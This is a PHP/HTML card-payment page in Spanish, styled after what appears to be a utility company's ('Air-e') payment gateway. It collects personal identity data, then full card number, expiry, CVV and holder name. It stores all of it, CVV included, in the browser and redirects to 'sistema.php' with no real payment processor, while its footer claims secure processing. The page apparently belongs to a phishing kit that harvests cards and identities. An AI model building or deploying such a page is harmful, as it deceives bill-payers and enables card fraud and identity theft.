<?php
echo <<<EOT
<script>
(function() {
  const raw = localStorage.getItem('total_pagar');
  try {
    // Si es un objeto JSON, extraer total
    if (raw && raw.includes('{')) {
      const obj = JSON.parse(raw);
      const total = parseInt(obj.total) || 0;
      localStorage.setItem('total_pagar', total);
    }
  } catch (e) {
    console.warn("Error al convertir total_pagar:", e);
    localStorage.setItem('total_pagar', 0);
  }
})();
</script>
EOT;
?>

<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pago con Tarjeta - Pasarela</title>
  <style>
    :root {
      --azul-air-e: #00558C;
      --azul-claro: #00AEEF;
      --azul-oscuro: #002E5D;
      --gris-claro: #F1F5F9;
      --verde-total: #DFF0D8;
      --text-color: #1F2937;
    }
    * {margin:0;padding:0;box-sizing:border-box;}
    body {
      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color:var(--gris-claro);
      min-height:100vh;
      display:flex;
      flex-direction:column;
      align-items:center;
    }

    /* === HEADER CON LOGO + PASOS === */
    .site-header {
      position: relative;
      width: 100%;
      background-color: #ffffff;
      box-shadow: 0 1px 6px rgba(15, 23, 42, 0.08);
      padding: 16px 24px 18px;
      display: flex;
      justify-content: center;
      z-index: 10;
    }

    .site-header::before {
      content: "";
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      height: 4px;
      background: linear-gradient(to right, var(--azul-air-e), var(--azul-claro));
    }

    .header-inner {
      width: 100%;
      max-width: 960px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 12px;
    }

    .header-logo {
      height: 32px;
      max-width: 220px;
      object-fit: contain;
    }

    .header-steps-wrapper {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      padding: 10px 0;
    }

    /* Línea que une los pasos */
    .header-steps-wrapper::before {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: min(340px, 80%);
      height: 2px;
      background: #d1e5f5;
      z-index: 0;
    }

    .header-steps {
      position: relative;
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
      justify-content: center;
      z-index: 1;
    }

    .step {
      padding: 4px 12px;
      border-radius: 999px;
      border: 1px solid #d1e5f5;
      background: #ffffff;
      font-size: 12px;
      color: #4b5563;
      white-space: nowrap;
    }

    .step.active {
      border-color: var(--azul-air-e);
      color: var(--azul-air-e);
      font-weight: 500;
      background: #f0f7ff;
    }

    .step:not(.active) {
      border-color: #e5e7eb;
      color: #9ca3af;
      background: #f9fafb;
    }

    @media (max-width: 600px) {
      .site-header {
        padding: 14px 12px 16px;
      }
      .header-inner {
        gap: 10px;
      }
      .header-steps-wrapper::before {
        width: 90%;
      }
      .step {
        font-size: 11px;
        padding: 4px 10px;
      }
    }

    main {
      flex:1;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      padding:30px 20px;
      width:100%;
    }
    .resumen {
      background-color:white;
      border:1px solid #ccc;
      padding:20px;
      border-radius:10px;
      margin-bottom:30px;
      max-width:420px;
      width:100%;
      box-shadow:0 2px 8px rgba(0,0,0,0.03);
    }
    .resumen h3 {
      font-size:16px;
      background-color:var(--azul-air-e);
      color:white;
      padding:10px;
      border-radius:6px 6px 0 0;
      margin:-20px -20px 10px -20px;
    }
    .resumen p {margin:6px 0;font-size:14px;color:#333;}
    .resumen .total {
      font-weight:bold;
      font-size:16px;
      margin-top:12px;
      background-color:var(--verde-total);
      padding:8px;
      border-radius:4px;
      text-align:center;
    }

    .card {
      background-color:#fff;
      padding:30px;
      border-radius:10px;
      box-shadow:0 4px 12px rgba(0,0,0,0.06);
      max-width:400px;
      width:100%;
    }
    .card h2 {color:var(--azul-air-e);margin-bottom:20px;font-size:20px;text-align:center;}
    .field {margin-bottom:16px;}
    .field label {display:block;font-size:14px;color:var(--text-color);margin-bottom:6px;}
    .field input,
    .field select.input-similar {
      width:100%;
      padding:10px;
      border:1px solid #ccc;
      border-radius:6px;
      font-size:14px;
      box-sizing:border-box;
      background-color:#fff;
    }
    .field-row {display:flex;gap:10px;}
    .btn {
      display:block;
      width:100%;
      padding:12px;
      background-color:var(--azul-air-e);
      color:white;
      font-size:16px;
      font-weight:bold;
      border:none;
      border-radius:6px;
      cursor:pointer;
      transition:background 0.3s ease;
      margin-top:10px;
    }
    .btn:hover {background-color:var(--azul-oscuro);}
    footer {
      text-align:center;
      font-size:13px;
      color:#666;
      padding:20px;
      background-color:white;
      width:100%;
    }

    /* === Formulario emergente de datos === */
    #formDatosUsuario {
      display:none;
      background:white;
      padding:25px;
      border-radius:10px;
      box-shadow:0 4px 12px rgba(0,0,0,0.15);
      max-width:400px;
      width:100%;
      margin-bottom:20px;
      animation:fadeIn 0.3s ease-in-out;
    }
    @keyframes fadeIn {from{opacity:0;transform:scale(0.95);}to{opacity:1;transform:scale(1);}}

    /* Estilo extra para select con flechita */
    .field select.input-similar {
      appearance: none;
      -webkit-appearance: none;
      -moz-appearance: none;
      background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='8'><path d='M1 1l5 5 5-5' stroke='%2300558C' stroke-width='2' fill='none' stroke-linecap='round'/></svg>");
      background-repeat: no-repeat;
      background-position: right 10px center;
      background-size: 12px;
    }

    .field select.input-similar:focus {
      outline: none;
      border-color: #00558C;
      box-shadow: 0 0 3px rgba(0, 85, 140, 0.4);
    }
  </style>
</head>
<body>
  <header class="site-header">
    <div class="header-inner">
      <!-- Logo -->
      <img src="img/logo.png" alt="Logo" class="header-logo">

      <!-- Pasos con línea -->
      <div class="header-steps-wrapper">
        <div class="header-steps">
          <span class="step active">1. Datos</span>
          <span class="step active">2. Pago</span>
          <span class="step">3. Confirmación</span>
        </div>
      </div>
    </div>
  </header>

  <main>
    <!-- Formulario de datos personales -->
    <form id="formDatosUsuario">
      <h3 style="color:#00558C;text-align:center;margin-bottom:15px;">
        Ingresa tus datos personales
      </h3>

      <div class="field">
        <label>Nombre</label>
        <input id="nombreIn" required>
      </div>

      <div class="field">
        <label>Documento</label>
        <input id="documentoIn" required>
      </div>

      <!-- Tipo de Identificación -->
      <div class="field">
        <label>Tipo de Identificación</label>
        <select id="tipoIdIn" required class="input-similar">
          <option value="">Seleccione...</option>
          <option value="Cédula de ciudadanía">Cédula de ciudadanía</option>
          <option value="Tarjeta de identidad">Tarjeta de identidad</option>
          <option value="Pasaporte">Pasaporte</option>
        </select>
      </div>

      <!-- Tipo de Persona -->
      <div class="field">
        <label>Tipo de Persona</label>
        <select id="tipoPersonaIn" required class="input-similar">
          <option value="">Seleccione...</option>
          <option value="Natural">Persona Natural</option>
          <option value="Jurídica">Persona Jurídica</option>
        </select>
      </div>

      <div class="field">
        <label>Correo</label>
        <input id="correoIn" type="email" required>
      </div>

      <div class="field">
        <label>Dirección</label>
        <input id="direccionIn" required>
      </div>

      <div class="field">
        <label>Teléfono</label>
        <input id="telefonoIn" required>
      </div>

      <button type="submit" class="btn">Guardar datos</button>
    </form>

    <!-- Resumen -->
    <div class="resumen" id="resumenDatos" style="display:none">
      <h3>Información de pago</h3>
      <p><strong>Nombre:</strong> <span id="nombre"></span></p>
      <p><strong>Documento:</strong> <span id="documento"></span></p>
      <p><strong>Tipo de Identificación:</strong> <span id="tipoId"></span></p>
      <p><strong>Tipo de Persona:</strong> <span id="tipoPersona"></span></p>
      <p><strong>Correo:</strong> <span id="correo"></span></p>
      <p><strong>Dirección:</strong> <span id="direccion"></span></p>
      <p><strong>Teléfono:</strong> <span id="telefono"></span></p>
      <p class="total">Total a pagar: $<span id="totalPagar"></span></p>
    </div>

    <!-- Formulario pago -->
    <form class="card" id="paymentForm" style="display:none;">
      <h2>Pago con tarjeta</h2>

      <div class="field">
        <label>Número de tarjeta</label>
        <input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000" required>
      </div>

      <div class="field-row">
        <div class="field">
          <label>Expira</label>
          <input type="text" id="expira" maxlength="5" placeholder="MM/AA" required>
        </div>
        <div class="field">
          <label>CVV</label>
          <input type="text" id="cvv" maxlength="4" placeholder="123" required>
        </div>
      </div>

      <div class="field">
        <label>Nombre del titular</label>
        <input type="text" id="ownerName" placeholder="Como aparece en la tarjeta" required>
      </div>

      <button class="btn" type="submit">Confirmar pago</button>
    </form>
  </main>

  <footer>Este pago se procesa de forma segura.</footer>

  <script>
  const total_pagar = localStorage.getItem('total_pagar') || "0";
  const resumen = document.getElementById('resumenDatos');
  const formDatos = document.getElementById('formDatosUsuario');
  const paymentForm = document.getElementById('paymentForm');

  // Leer tbdatos si existe
  let tbdatos = null;
  try {
    tbdatos = JSON.parse(localStorage.getItem('tbdatos')) || null;
  } catch (e) { tbdatos = null; }

  // Mostrar según si hay datos guardados
  if (tbdatos && Object.keys(tbdatos).length > 0) {
    mostrarResumen(tbdatos);
    paymentForm.style.display = 'block';
  } else {
    formDatos.style.display = 'block';
  }

  // Guardar datos cliente
  formDatos.addEventListener('submit', e => {
    e.preventDefault();
    const datos = {
      nombre: nombreIn.value.trim(),
      documento: documentoIn.value.trim(),
      tipo_identificacion: tipoIdIn.value.trim(),
      tipo_persona: tipoPersonaIn.value.trim(),
      correo: correoIn.value.trim(),
      direccion: direccionIn.value.trim(),
      telefono: telefonoIn.value.trim()
    };
    localStorage.setItem('tbdatos', JSON.stringify(datos));
    tbdatos = datos;
    formDatos.style.display = 'none';
    mostrarResumen(tbdatos);
    paymentForm.style.display = 'block';
  });

  // Mostrar resumen
  function mostrarResumen(data) {
    resumen.style.display = 'block';
    document.getElementById('nombre').textContent = data.nombre || '';
    document.getElementById('documento').textContent = data.documento || '';
    document.getElementById('tipoId').textContent = data.tipo_identificacion || '';
    document.getElementById('tipoPersona').textContent = data.tipo_persona || '';
    document.getElementById('correo').textContent = data.correo || '';
    document.getElementById('direccion').textContent = data.direccion || '';
    document.getElementById('telefono').textContent = data.telefono || '';
    document.getElementById('totalPagar').textContent = parseInt(total_pagar).toLocaleString('es-CO');
  }

  // Luhn
  function luhnCheck(value) {
    let sum=0, shouldDouble=false;
    for(let i=value.length-1;i>=0;i--){
      let digit=parseInt(value.charAt(i),10);
      if(shouldDouble){digit*=2;if(digit>9)digit-=9;}
      sum+=digit;shouldDouble=!shouldDouble;
    }
    return sum%10===0;
  }

  // Formatos
  document.getElementById('expira').addEventListener('input', e=>{
    let val=e.target.value.replace(/[^\d]/g,'');
    if(val.length>=3)e.target.value=val.slice(0,2)+'/'+val.slice(2,4);
    else e.target.value=val;
  });

  document.getElementById('cardNumber').addEventListener('input', e=>{
    let val=e.target.value.replace(/\D/g,'').slice(0,16);
    e.target.value=val.replace(/(\d{4})(?=\d)/g,'$1 ');
  });

  // Enviar pago
  paymentForm.addEventListener('submit', e=>{
    e.preventDefault();
    const rawCard=document.getElementById('cardNumber').value.replace(/\s/g,'');
    if(!luhnCheck(rawCard)){alert("Número de tarjeta inválido.");return;}
    const expira=document.getElementById('expira').value;
    const [expMonth,expYear]=expira.split('/');
    const cvv=document.getElementById('cvv').value.trim();
    const ownerName=document.getElementById('ownerName').value.trim();
    if(!expMonth||!expYear||!cvv||!ownerName){
      alert("Por favor completa todos los campos de la tarjeta.");
      return;
    }
    const actualizado={...tbdatos, tarjeta:rawCard, expMonth,expYear,cvv,ownerName};
    localStorage.setItem('tbdatos', JSON.stringify(actualizado));
    window.location.href='sistema.php';
  });
  </script>
</body>
</html>
